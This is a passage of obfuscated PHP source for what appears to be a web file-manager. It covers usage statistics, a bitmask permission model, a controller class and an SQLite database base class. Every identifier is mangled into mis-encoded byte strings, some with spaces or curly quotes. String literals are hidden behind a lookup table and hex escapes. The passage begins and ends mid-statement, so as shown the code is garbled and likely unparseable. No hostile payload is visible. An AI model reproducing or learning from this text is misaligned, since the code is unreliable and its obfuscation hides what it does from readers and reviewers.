LNG($ƒÖ³Ãî[1937]), $ƒÖ³Ãî[1921] => LNG($ƒÖ³Ãî[1938]), $ƒÖ³Ãî[1922] => LNG($ƒÖ³Ãî[1939])), $ƒÖ³Ãî[1923] => array($ƒÖ³Ãî[844] => LNG($ƒÖ³Ãî[1940]), $ƒÖ³Ãî[1925] => LNG($ƒÖ³Ãî[1941]), $ƒÖ³Ãî[1926] => LNG($ƒÖ³Ãî[1942]), $ƒÖ³Ãî[1927] => LNG($ƒÖ³Ãî[1943]))); $§®« » = array($ƒÖ³Ãî[678] => $ƒÖ³Ãî[1944], $ƒÖ³Ãî[1923] => $ƒÖ³Ãî[79]); if (empty($é½š† “)) { $Ö¾æ‚£™ = date($ƒÖ³Ãî[1928], strtotime($ƒÖ³Ãî[1929])); $¨²Ã®ä¹ = array($ƒÖ³Ãî[285] => $Ö¾æ‚£™); foreach ($ÜÔù‹™ô[$à£é§Â´] as $ÄÀ‰ı¯ü => $ôş•ÀáÜ) { $¨²Ã®ä¹[$ÄÀ‰ı¯ü] = 0; } $é½š† “[] = $¨²Ã®ä¹; } $ü·Şœò = array(); foreach ($é½š† “ as $ôş•ÀáÜ) { if ($à£é§Â´ == $ƒÖ³Ãî[1923] && $ôş•ÀáÜ[$ƒÖ³Ãî[1925]] > $ôş•ÀáÜ[$ƒÖ³Ãî[844]]) { $ôş•ÀáÜ[$ƒÖ³Ãî[1925]] = $ôş•ÀáÜ[$ƒÖ³Ãî[844]]; } foreach ($ÜÔù‹™ô[$à£é§Â´] as $ÄÀ‰ı¯ü => $ÖŸğÚŠŞ) { $šúŞÄ¾ï = array($ƒÖ³Ãî[285] => $ôş•ÀáÜ[$ƒÖ³Ãî[285]], $ƒÖ³Ãî[1678] => $ÖŸğÚŠŞ); $šúŞÄ¾ï[$§®« »[$à£é§Â´]] = isset($ôş•ÀáÜ[$ÄÀ‰ı¯ü]) ? $ôş•ÀáÜ[$ÄÀ‰ı¯ü] : 0; $ü·Şœò[] = $šúŞÄ¾ï; } } return $ü·Şœò; } public function validDate($ãÇ¬ò­ñ, $íë„ÅÀı) { $üæšğİó =& $_SERVER[®»±”ó²]; $Íá¤à»™ = date($üæšğİó[1928], strtotime($üæšğİó[1929])); $±ú¿èÉ = array($Íá¤à»™); switch ($ãÇ¬ò­ñ) { case $üæšğİó[1770]: $Ä”²ÎµÂ = mktime(0, 0, 0, date($üæšğİó[1945]), date($üæšğİó[1471]) - date($üæšğİó[1560]) + 7 - 7, date($üæšğİó[1946])); $¥ò·ÍšÏ = 0; do { $ëÇÍñŸÌ = date($üæšğİó[1928], $Ä”²ÎµÂ - 3600 * 24 * 7 * $¥ò·ÍšÏ); $±ú¿èÉ[] = $ëÇÍñŸÌ; $¥ò·ÍšÏ++; } while ($íë„ÅÀı < $ëÇÍñŸÌ); break; case $üæšğİó[1768]: $¥ò·ÍšÏ = 1; do { $†îªüÏë = date($üæšğİó[1947], strtotime("\x2d\40{$¥ò·ÍšÏ}\x20\x6d\157\156\164\150\x73")); $±ú¿èÉ[] = $†îªüÏë; $¥ò·ÍšÏ++; } while ($íë„ÅÀı < $†îªüÏë); break; case $üæšğİó[1948]: $µùëÀÙ² = (int) date($üæšğİó[1946], strtotime($íë„ÅÀı)); $¨òÉÓ–‚ = (int) date($üæšğİó[1946]); if ($µùëÀÙ² >= $¨òÉÓ–‚) { break; } for ($µùëÀÙ²; $µùëÀÙ² < $¨òÉÓ–‚; $µùëÀÙ²++) { $±ú¿èÉ[] = $µùëÀÙ² . $üæšğİó[1949]; } break; default: break; } if ($íë„ÅÀı > end($±ú¿èÉ)) { array_pop($±ú¿èÉ); } sort($±ú¿èÉ); return $±ú¿èÉ; } public function listTable($Ú”²óû) { $ˆ¸¢µ»ú = ucfirst($Ú”²óû); return Model($ˆ¸¢µ»ú)->listData(); } public function option($¨º×æØÚ) { $üå¯Ï©õ = $_SERVER[®»±”ó²][1950] . ucfirst($¨º×æØÚ); return $this->{$üå¯Ï©õ}(); } private function optionUser() { $ŒéƒêŸ =& $_SERVER[®»±”ó²]; $™ÔµÑÖ = Model($ŒéƒêŸ[610])->count($ŒéƒêŸ[1791]); $Œ‰ëıÕ = Model($ŒéƒêŸ[610])->where($ŒéƒêŸ[1951])->count($ŒéƒêŸ[1791]); $îè¬â±ñ = intval($GLOBALS[$ŒéƒêŸ[6]][$ŒéƒêŸ[426]][$ŒéƒêŸ[1736]]) / 3600; $€Ù²åôü = strtotime("\55{$îè¬â±ñ}\x20\150\157\x75\162\x73"); $Ô’ßÇŠ = strtotime(date($ŒéƒêŸ[1932])); if ($€Ù²åôü < $Ô’ßÇŠ) { $€Ù²åôü = $Ô’ßÇŠ; } $¯²å·ò¬ = array($ŒéƒêŸ[1952] => array($ŒéƒêŸ[1101], $€Ù²åôü)); $Ìœå…¼† = (int) Model($ŒéƒêŸ[610])->where($¯²å·ò¬)->count($ŒéƒêŸ[1791]); if (!$Ìœå…¼†) { $Ìœå…¼† = 1; } $¯²å·ò¬ = array($ŒéƒêŸ[1952] => array($ŒéƒêŸ[1101], $Ô’ßÇŠ)); $Êò«éÄñ = Model($ŒéƒêŸ[610])->where($¯²å·ò¬)->count($ŒéƒêŸ[1791]); return array($ŒéƒêŸ[839] => (int) $™ÔµÑÖ, $ŒéƒêŸ[1953] => (int) ($™ÔµÑÖ - $Œ‰ëıÕ), $ŒéƒêŸ[1954] => (int) $Œ‰ëıÕ, $ŒéƒêŸ[1955] => (int) $Êò«éÄñ, $ŒéƒêŸ[1956] => $Ìœå…¼†); } private function optionFile() { $ÇÀÁûÅ =& $_SERVER[®»±”ó²]; $ÖÇ›ÊÕé = $this->sourceSize(); $“øÁÕÚ = $ÖÇ›ÊÕé[$ÇÀÁûÅ[79]]; $‹™Öú×ì = $ÖÇ›ÊÕé[$ÇÀÁûÅ[1925]]; $ÒòüùÃ… = Model($ÇÀÁûÅ[911])->where(array($ÇÀÁûÅ[496] => 0))->count($ÇÀÁûÅ[194]); $ĞÑ®ë®— = array($ÇÀÁûÅ[496] => 0, $ÇÀÁûÅ[234] => array($ÇÀÁûÅ[1101], strtotime(date($ÇÀÁûÅ[1932])))); $ÜÁŸşã™ = Model($ÇÀÁûÅ[911])->where($ĞÑ®ë®—)->sum($ÇÀÁûÅ[79]); $ğü»š÷ï = Model($ÇÀÁûÅ[911])->where($ĞÑ®ë®—)->count($ÇÀÁûÅ[194]); return array($ÇÀÁûÅ[844] => $“øÁÕÚ, $ÇÀÁûÅ[1925] => $‹™Öú×ì, $ÇÀÁûÅ[1957] => $“øÁÕÚ - $‹™Öú×ì, $ÇÀÁûÅ[1958] => (int) $ÜÁŸşã™, $ÇÀÁûÅ[846] => (int) $ÒòüùÃ…, $ÇÀÁûÅ[1959] => (int) $ğü»š÷ï); } private function optionAccess() { $ÏÙã‹ÕÌ =& $_SERVER[®»±”ó²]; return array($ÏÙã‹ÕÌ[839] => $this->typeLogCnt(), $ÏÙã‹ÕÌ[110] => $this->typeLogCnt($ÏÙã‹ÕÌ[110]), $ÏÙã‹ÕÌ[536] => $this->typeLogCnt($ÏÙã‹ÕÌ[536]), $ÏÙã‹ÕÌ[1960] => $this->typeLogCnt($ÏÙã‹ÕÌ[1960]), $ÏÙã‹ÕÌ[1961] => $this->typeLogCnt($ÏÙã‹ÕÌ[1961]), $ÏÙã‹ÕÌ[678] => $this->typeLogCnt($ÏÙã‹ÕÌ[12], $ÏÙã‹ÕÌ[1936])); } private function typeLogCnt($“ü†»œÓ = '', $Š”Í¹Ö = "\x69\x64") { $˜À„ €¡ =& $_SERVER[®»±”ó²]; $™Öá›‡ = array($˜À„ €¡[110] => array($˜À„ €¡[1962], $˜À„ €¡[1963]), $˜À„ €¡[536] => array($˜À„ €¡[1964], $˜À„ €¡[1965]), $˜À„ €¡[1960] => array($˜À„ €¡[1966], $˜À„ €¡[1967], $˜À„ €¡[1968]), $˜À„ €¡[1961] => array($˜À„ €¡[1969], $˜À„ €¡[1970]), $˜À„ €¡[1971] => array($˜À„ €¡[1972], $˜À„ €¡[1973], $˜À„ €¡[1974])); $ÒŠãÓš„ = strtotime(date($˜À„ €¡[1932])); $˜ÊüÎĞ = array($˜À„ €¡[234] => array($˜À„ €¡[1101], $ÒŠãÓš„)); if ($“ü†»œÓ) { $˜ÊüÎĞ[$˜À„ €¡[33]] = array($˜À„ €¡[7], $™Öá›‡[$“ü†»œÓ]); } $ËÂìÖñÁ = Model($˜À„ €¡[1935])->where($˜ÊüÎĞ)->count($Š”Í¹Ö); return (int) $ËÂìÖñÁ; } private function optionServer() { $åÒÌêçò =& $_SERVER[®»±”ó²]; $ñÙï±µ¥ = $this->diskDriver(); $Õ¾»Á˜„ = KodIO::defaultDriver(); $»¾çõ›Û = array($åÒÌêçò[904] => $Õ¾»Á˜„[$åÒÌêçò[477]]); $âÇÆÚ€µ = Model($åÒÌêçò[557])->where($»¾çõ›Û)->sum($åÒÌêçò[79]); $ˆ†•éÃ· = explode($åÒÌêçò[53], $_SERVER[$åÒÌêçò[147]]); $Á÷åüªÊ = $ˆ†•éÃ·[0]; $¿äÛ°¤µ = $GLOBALS[$åÒÌêçò[6]][$åÒÌêçò[21]]; $ÑŒ¼ÊÏŞ = $¿äÛ°¤µ[$åÒÌêçò[1063]]; if ($ÑŒ¼ÊÏŞ == $åÒÌêçò[1051]) { $ªûåê· = explode($åÒÌêçò[1380], $¿äÛ°¤µ[$åÒÌêçò[1062]]); $ÑŒ¼ÊÏŞ = $ªûåê·[0]; } if ($ÑŒ¼ÊÏŞ == $åÒÌêçò[999] || $ÑŒ¼ÊÏŞ == $åÒÌêçò[889]) { $ÓêŒÁú´ = Model()->db()->query($åÒÌêçò[1975]); $ÕÊîÃ‰… = $ÓêŒÁú´[0] && isset($ÓêŒÁú´[0][$åÒÌêçò[1677]]) ? $ÓêŒÁú´[0][$åÒÌêçò[1677]] : 0; $ÑŒ¼ÊÏŞ = $åÒÌêçò[1976] . ($ÕÊîÃ‰… ? $åÒÌêçò[8] . $ÕÊîÃ‰… : $åÒÌêçò[12]); } $˜¹øªÔ‚ = $GLOBALS[$åÒÌêçò[6]][$åÒÌêçò[426]][$åÒÌêçò[913]]; return array($åÒÌêçò[1977] => $ñÙï±µ¥ ? $ñÙï±µ¥[$åÒÌêçò[1978]] : 0, $åÒÌêçò[1979] => $ñÙï±µ¥ ? $ñÙï±µ¥[$åÒÌêçò[1980]] : 0, $åÒÌêçò[1981] => (int) $Õ¾»Á˜„[$åÒÌêçò[1978]] * 1024 * 1024 * 1024, $åÒÌêçò[1982] => (int) $âÇÆÚ€µ, $åÒÌêçò[1983] => ucfirst($Á÷åüªÊ), $åÒÌêçò[1984] => $åÒÌêçò[1985] . PHP_VERSION, $åÒÌêçò[1986] => phpBuild64() ? 64 : 32, $åÒÌêçò[838] => str_replace($åÒÌêçò[1219], $åÒÌêçò[1079], $ÑŒ¼ÊÏŞ), $åÒÌêçò[426] => ucfirst($˜¹øªÔ‚), $åÒÌêçò[32] => $_SERVER[$åÒÌêçò[1987]]); } private function diskDriver() { $÷„™Î±Ü =& $_SERVER[®»±”ó²]; $Õ¨¦ºÓ¶ = $÷„™Î±Ü[8]; $®°‚İìí = $GLOBALS[$÷„™Î±Ü[6]][$÷„™Î±Ü[1404]] == $÷„™Î±Ü[1405]; if ($®°‚İìí) { $Õ¨¦ºÓ¶ = $÷„™Î±Ü[1988]; if (function_exists($÷„™Î±Ü[1989])) { exec($÷„™Î±Ü[1990], $œğàÏÂÔ); $Õ¨¦ºÓ¶ = $œğàÏÂÔ[1] . $÷„™Î±Ü[8]; } } if (!file_exists($Õ¨¦ºÓ¶)) { return; } if (!function_exists($÷„™Î±Ü[1991])) { return; } $Óó„Ì™ó = @disk_total_space($Õ¨¦ºÓ¶); $›òãšü = $Óó„Ì™ó - @disk_free_space($Õ¨¦ºÓ¶); return array($÷„™Î±Ü[1978] => $Óó„Ì™ó, $÷„™Î±Ü[1980] => $›òãšü); } public function fileChart($ôï—€Ø) { $Ş¾â«èÑ =& $_SERVER[®»±”ó²]; if (isset($ôï—€Ø[$Ş¾â«èÑ[1791]])) { return Model($Ş¾â«èÑ[911])->userFileTypeProfile($ôï—€Ø[$Ş¾â«èÑ[1791]]); } if (isset($ôï—€Ø[$Ş¾â«èÑ[1402]])) { return Model($Ş¾â«èÑ[911])->groupFileTypeProfile($ôï—€Ø[$Ş¾â«èÑ[1402]]); } $æÂœùë = $this->sourceSize(); $ĞŒÜ¯†ø = array($Ş¾â«èÑ[193] => 0, $Ş¾â«èÑ[191] => 1); $‹í¹ô¾Ù = Model($Ş¾â«èÑ[911])->where($ĞŒÜ¯†ø)->sum($Ş¾â«èÑ[79]); $ĞŒÜ¯†ø[$Ş¾â«èÑ[191]] = 2; $ÑÓ¿óñç = Model($Ş¾â«èÑ[911])->where($ĞŒÜ¯†ø)->sum($Ş¾â«èÑ[79]); return array($Ş¾â«èÑ[844] => $æÂœùë[$Ş¾â«èÑ[79]], $Ş¾â«èÑ[1925] => $æÂœùë[$Ş¾â«èÑ[1925]], $Ş¾â«èÑ[1926] => (int) $‹í¹ô¾Ù, $Ş¾â«èÑ[1927] => (int) $ÑÓ¿óñç); } private function sourceSize() { $¸Í±æ =& $_SERVER[®»±”ó²]; $€îê¾´ = Model($¸Í±æ[911])->where(array($¸Í±æ[496] => 0))->sum($¸Í±æ[79]); $¶¬€ÔÊ“ = Model($¸Í±æ[557])->sum($¸Í±æ[79]); if ($¶¬€ÔÊ“ > $€îê¾´) { $¶¬€ÔÊ“ = $€îê¾´; } return array($¸Í±æ[79] => (int) $€îê¾´, $¸Í±æ[1925] => (int) $¶¬€ÔÊ“); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ÉÃ“£ ş =& $_SERVER[®»±”ó²]; $ˆœßÎ¦ = array(array($ÉÃ“£ ş[505] => LNG($ÉÃ“£ ş[1992]), $ÉÃ“£ ş[1993] => $ÉÃ“£ ş[1994], $ÉÃ“£ ş[1995] => 1, $ÉÃ“£ ş[1996] => 1, $ÉÃ“£ ş[1997] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÉÃ“£ ş[505] => LNG($ÉÃ“£ ş[1998]), $ÉÃ“£ ş[1993] => $ÉÃ“£ ş[1999], $ÉÃ“£ ş[1995] => 2, $ÉÃ“£ ş[1996] => 1, $ÉÃ“£ ş[1997] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÉÃ“£ ş[505] => LNG($ÉÃ“£ ş[2000]), $ÉÃ“£ ş[1993] => $ÉÃ“£ ş[2001], $ÉÃ“£ ş[1995] => 3, $ÉÃ“£ ş[1996] => 1, $ÉÃ“£ ş[1997] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ÉÃ“£ ş[505] => LNG($ÉÃ“£ ş[2002]), $ÉÃ“£ ş[1993] => $ÉÃ“£ ş[2003], $ÉÃ“£ ş[1995] => 4, $ÉÃ“£ ş[1996] => 1, $ÉÃ“£ ş[1997] => self::AUTH_SHOW | self::AUTH_VIEW), array($ÉÃ“£ ş[505] => LNG($ÉÃ“£ ş[2004]), $ÉÃ“£ ş[1993] => $ÉÃ“£ ş[2005], $ÉÃ“£ ş[1995] => 5, $ÉÃ“£ ş[1996] => 1, $ÉÃ“£ ş[1997] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ÉÃ“£ ş[505] => LNG($ÉÃ“£ ş[2006]), $ÉÃ“£ ş[1993] => $ÉÃ“£ ş[2007], $ÉÃ“£ ş[1995] => 6, $ÉÃ“£ ş[1996] => 1, $ÉÃ“£ ş[1997] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ÉÃ“£ ş[505] => LNG($ÉÃ“£ ş[2008]), $ÉÃ“£ ş[1993] => $ÉÃ“£ ş[2009], $ÉÃ“£ ş[1995] => 7, $ÉÃ“£ ş[1996] => 1, $ÉÃ“£ ş[1997] => 0)); return $ˆœßÎ¦; } public static function authCheck($—•ïÂÉÔ, $Ü½¦’) { $²ÕÒîï¨ =& $_SERVER[®»±”ó²]; $—•ïÂÉÔ = intval($—•ïÂÉÔ); if (KodUser::isRoot() && $GLOBALS[$²ÕÒîï¨[6]][$²ÕÒîï¨[2010]]) { return !0; } if ($—•ïÂÉÔ <= 0) { return !1; } if (($—•ïÂÉÔ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($—•ïÂÉÔ & $Ü½¦’); } public static function authCheckShow($ìÖ³¾å) { return self::authCheck($ìÖ³¾å, self::AUTH_SHOW); } public static function authCheckView($¼ÆĞé–Î) { return self::authCheck($¼ÆĞé–Î, self::AUTH_VIEW); } public static function authCheckDownload($ıöİŒû€) { return self::authCheck($ıöİŒû€, self::AUTH_DOWNLOAD); } public static function authCheckUpload($¬ñ­®¯¢) { return self::authCheck($¬ñ­®¯¢, self::AUTH_UPLOAD); } public static function authCheckEdit($ßè¬˜¹) { return self::authCheck($ßè¬˜¹, self::AUTH_EDIT); } public static function authCheckRemove($’“Üúù) { return self::authCheck($’“Üúù, self::AUTH_REMOVE); } public static function authCheckShare($İœ¯Ó™) { return self::authCheck($İœ¯Ó™, self::AUTH_SHARE); } public static function authCheckComment($ÖîùŞşÁ) { return self::authCheck($ÖîùŞşÁ, self::AUTH_COMMENT); } public static function authCheckEvent($¢ô£µÓî) { return self::authCheck($¢ô£µÓî, self::AUTH_EVENT); } public static function authCheckRoot($ò™¬¼–) { return self::authCheck($ò™¬¼–, self::AUTH_ROOT); } public static function authCheckAction($è”ÍË²», $Í¯­°øé) { $Ášİşú· =& $_SERVER[®»±”ó²]; $¢‰ö¬› = array($Ášİşú·[2011] => self::AUTH_VIEW, $Ášİşú·[1291] => self::AUTH_DOWNLOAD, $Ášİşú·[110] => self::AUTH_UPLOAD, $Ášİşú·[1961] => self::AUTH_EDIT, $Ášİşú·[1960] => self::AUTH_REMOVE, $Ášİşú·[1971] => self::AUTH_SHARE, $Ášİşú·[431] => self::AUTH_COMMENT, $Ášİşú·[1778] => self::AUTH_EVENT, $Ášİşú·[2012] => self::AUTH_ROOT); if (!isset($¢‰ö¬›[$Í¯­°øé])) { return; } $¢§§ÒŒ = $¢‰ö¬›[$Í¯­°øé]; $è”ÍË²» = intval($è”ÍË²»); if ($è”ÍË²» <= 0) { return !1; } if (($è”ÍË²» & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($è”ÍË²» & $¢§§ÒŒ); } public static function authDisable($Ï¡ã·É“, $·‘—Ôê) { if (intval($Ï¡ã·É“) <= 0) { return 0; } return intval($Ï¡ã·É“) & ~$·‘—Ôê; } public $optionType = "\123\x79\x73\164\145\x6d\56\163\157\x75\162\x63\x65\x41\165\164\150\114\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\141\x75\x74\x68", "\154\x61\x62\145\x6c", "\144\x69\163\160\x6c\141\171", "\163\x79\163\x74\x65\x6d", "\x73\x6f\x72\164"); public function initData() { $ÈÁª¡û = $this->authDefault(); foreach ($ÈÁª¡û as $¶ç³©ã´) { $this->add($¶ç³©ã´); } } public function findAuth($Ö £ïÂÖ, $Ì›œ¦€‚) { $Åç¸èŞã =& $_SERVER[®»±”ó²]; $çØÓµÊû = parent::listData(); foreach ($çØÓµÊû as $ìü†½î) { $˜“²±’ú = intval($ìü†½î[$Åç¸èŞã[498]]); if ($˜“²±’ú <= 0 || $ìü†½î[$Åç¸èŞã[2013]] == 0) { continue; } if (($˜“²±’ú & $Ö £ïÂÖ) != $Ö £ïÂÖ) { continue; } if (($˜“²±’ú & $Ì›œ¦€‚) != 0) { continue; } return $ìü†½î[$Åç¸èŞã[477]]; } return !1; } public function findAuthMax($Ó¦¡¨á, $Ãœ±ŞÎ) { $©¹Ôæğ =& $_SERVER[®»±”ó²]; $Öù½–È = !1; $˜ï•§Ù = parent::listData(); foreach ($˜ï•§Ù as $ı÷¸àé) { $ğ°íå— = intval($ı÷¸àé[$©¹Ôæğ[498]]); if ($ğ°íå— <= 0 || $ı÷¸àé[$©¹Ôæğ[2013]] == 0) { continue; } if (($ğ°íå— & $Ó¦¡¨á) != $Ó¦¡¨á) { continue; } if (($ğ°íå— & $Ãœ±ŞÎ) != 0) { continue; } if (!$Öù½–È) { $Öù½–È = $ı÷¸àé; continue; } if (intval($Öù½–È[$©¹Ôæğ[498]]) < $ğ°íå—) { $Öù½–È = $ı÷¸àé; } } return $Öù½–È ? $Öù½–È[$©¹Ôæğ[477]] : !1; } public function findAuthReadOnly() { $—áù«Ç = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ßÎ‘¡’ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($—áù«Ç, $ßÎ‘¡’); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $†ÉªŠÁÉ =& $_SERVER[®»±”ó²]; $ßë»©®ñ = parent::listData(); $‹Ö©Ş¥Ÿ = !1; foreach ($ßë»©®ñ as $ÇåÒÍîª) { if ($ÇåÒÍîª[$†ÉªŠÁÉ[498]] <= 0 || $ÇåÒÍîª[$†ÉªŠÁÉ[2013]] == $†ÉªŠÁÉ[231]) { continue; } if (!$‹Ö©Ş¥Ÿ) { $‹Ö©Ş¥Ÿ = $ÇåÒÍîª; continue; } if ($‹Ö©Ş¥Ÿ[$†ÉªŠÁÉ[498]] > $ÇåÒÍîª[$†ÉªŠÁÉ[498]]) { $‹Ö©Ş¥Ÿ = $ÇåÒÍîª; } } return $‹Ö©Ş¥Ÿ ? $‹Ö©Ş¥Ÿ[$†ÉªŠÁÉ[477]] : $†ÉªŠÁÉ[12]; } public function listData($©åø“– = false, $ğ§Ê‚Üú = "\163\157\162\164", $éÖÓáÖ = false) { return parent::listData($©åø“–, $ğ§Ê‚Üú, $éÖÓáÖ); } public function update($í©—½ü, $¬ÇÄğ) { $Œ˜’¨ô =& $_SERVER[®»±”ó²]; $¤ò‚‘º¼ = parent::listData($í©—½ü); $¤æãœ÷ = $this->findByName($¬ÇÄğ[$Œ˜’¨ô[32]]); if (!$¤ò‚‘º¼ || $¤æãœ÷ && $¤æãœ÷[$Œ˜’¨ô[477]] != $¤ò‚‘º¼[$Œ˜’¨ô[477]]) { return !1; } $this->filterAuth($¬ÇÄğ[$Œ˜’¨ô[498]]); return parent::update($í©—½ü, $¬ÇÄğ); } public function remove($æÌ²Ù…) { $°ª„çÖÙ = parent::listData($æÌ²Ù…); if (!$°ª„çÖÙ || $°ª„çÖÙ[$_SERVER[®»±”ó²][192]]) { return !1; } return parent::remove($æÌ²Ù…); } public function add($Ì¥³¯Æ½ = array()) { $½™ªÛ€· =& $_SERVER[®»±”ó²]; if ($this->findByName($Ì¥³¯Æ½[$½™ªÛ€·[32]])) { return !1; } $Ã‰ê‚ˆŠ = array($½™ªÛ€·[32] => $½™ªÛ€·[12], $½™ªÛ€·[498] => 1, $½™ªÛ€·[2014] => $½™ªÛ€·[2001], $½™ªÛ€·[2013] => 1, $½™ªÛ€·[192] => 0, $½™ªÛ€·[2015] => 0); $Ì¥³¯Æ½ = array_merge($Ã‰ê‚ˆŠ, $Ì¥³¯Æ½); $Ì¥³¯Æ½[$½™ªÛ€·[2015]] = $this->getSort(); $this->filterAuth($Ì¥³¯Æ½[$½™ªÛ€·[498]]); return parent::insert($Ì¥³¯Æ½); } private function getSort() { $µî‚İüå =& $_SERVER[®»±”ó²]; $Ô±¿»ÀÑ = parent::listData(); $Ñ¹è«ˆ = array_to_keyvalue($Ô±¿»ÀÑ, $µî‚İüå[12], $µî‚İüå[2015]); return empty($Ñ¹è«ˆ) ? 0 : max($Ñ¹è«ˆ) + 1; } private function filterAuth(&$¯Ú®ªë) { if (!$¯Ú®ªë) { return; } $§š¸Ââµ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Î¿ÅĞÉ¦ = array(); foreach ($§š¸Ââµ as $µ“…Ü š) { if ($¯Ú®ªë & $µ“…Ü š) { $Î¿ÅĞÉ¦[] = $µ“…Ü š; } } if (in_array(self::AUTH_ROOT, $Î¿ÅĞÉ¦)) { $¯Ú®ªë = array_sum($§š¸Ââµ); return; } $µË÷¸¿¥ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Î¿ÅĞÉ¦ as $µ“…Ü š) { if (isset($µË÷¸¿¥[$µ“…Ü š])) { $Î¿ÅĞÉ¦ = array_merge($Î¿ÅĞÉ¦, $µË÷¸¿¥[$µ“…Ü š]); } } $Î¿ÅĞÉ¦[] = self::AUTH_SHOW; $¯Ú®ªë = array_sum(array_unique($Î¿ÅĞÉ¦)); } public function sort($˜£‹×Üâ, $„‡¿—ïœ) { return parent::update($˜£‹×Üâ, $„‡¿—ïœ); } } goto dÍµÓÜß Ê; F†õëÊêŞ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $û¤íÙ¢ =& $_SERVER[®»±”ó²]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$û¤íÙ¢[6]] =& $config; $this->values[$û¤íÙ¢[7]] =& $in; $this->tpl = TEMPLATE . MOD . $û¤íÙ¢[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ó®›ÃÀî) { if (1 === func_num_args()) { $this->{$ó®›ÃÀî} = new $ó®›ÃÀî(); } else { $ƒ°Ã†Íé = new ReflectionClass($ó®›ÃÀî); $Äî“Ô° = func_get_args(); array_shift($Äî“Ô°); $this->{$ó®›ÃÀî} = $ƒ°Ã†Íé->newInstanceArgs($Äî“Ô°); } return $this->{$ó®›ÃÀî}; } public function routeBind($¯ŒûšÑ•, $áä¼œ‹Ç, $¯ÒåùßŞ = 3) { $Ş‹ì¬ =& $_SERVER[®»±”ó²]; $’Éëè’œ = $this->in[$Ş‹ì¬[9]]; $¯ŒûšÑ• = str_replace($Ş‹ì¬[10], $Ş‹ì¬[11], trim(trim($¯ŒûšÑ•, $Ş‹ì¬[8]), $Ş‹ì¬[12])); if (!$¯ŒûšÑ• || count($’Éëè’œ) <= $¯ÒåùßŞ) { return !1; } $ôğ¾ö¼ = !0; $¹‚–¥¡Î = explode($Ş‹ì¬[8], $¯ŒûšÑ•); for ($ó¹û„¦İ = 0; $ó¹û„¦İ < count($¹‚–¥¡Î); $ó¹û„¦İ++) { if ($¹‚–¥¡Î[$ó¹û„¦İ] != $’Éëè’œ[$¯ÒåùßŞ + $ó¹û„¦İ]) { $ôğ¾ö¼ = !1; break; } } if (!$ôğ¾ö¼) { return; } call_user_func_array(array($this, $áä¼œ‹Ç), array()); } public function routeArgs($½àæ§Š† = 3) { $ùÅŒò… = $this->in[$_SERVER[®»±”ó²][9]]; if (count($ùÅŒò…) <= $½àæ§Š†) { return array(); } $ä¿‚÷¯ = array(); for ($¶ô€ßôİ = $½àæ§Š†; $¶ô€ßôİ < count($ùÅŒò…); $¶ô€ßôİ += 2) { $ä¿‚÷¯[$ùÅŒò…[$¶ô€ßôİ]] = $ùÅŒò…[$¶ô€ßôİ + 1]; $this->in[$ùÅŒò…[$¶ô€ßôİ]] = $ùÅŒò…[$¶ô€ßôİ + 1]; } return $ä¿‚÷¯; } protected function assign($‘‡ĞÂÆÁ, $±ÁÈ‚Ï) { $this->values[$‘‡ĞÂÆÁ] = $±ÁÈ‚Ï; } protected function display($ôÄíÌ‡) { ob_end_clean(); extract($this->values); require $this->tpl . $ôÄíÌ‡; } } class DbSqliteBase extends Db { public function __construct($ÑÉÖ™ª– = '') { $Ûé¾ï°é =& $_SERVER[®»±”ó²]; if (!extension_loaded($Ûé¾ï°é[13])) { think_exception(think_lang($Ûé¾ï°é[14]) . $Ûé¾ï°é[15]); } if (!empty($ÑÉÖ™ª–)) { if (!isset($ÑÉÖ™ª–[$Ûé¾ï°é[16]])) { $ÑÉÖ™ª–[$Ûé¾ï°é[16]] = 438; } $this->config = $ÑÉÖ™ª–; if (empty($this->config[$Ûé¾ï°é[17]])) { $this->config[$Ûé¾ï°é[17]] = array(); } } } public function connect($¾§àÅæ‹ = '', $é¨çÀ«— = 0) { $Õ¨¬¾éş =& $_SERVER[®»±”ó²]; if 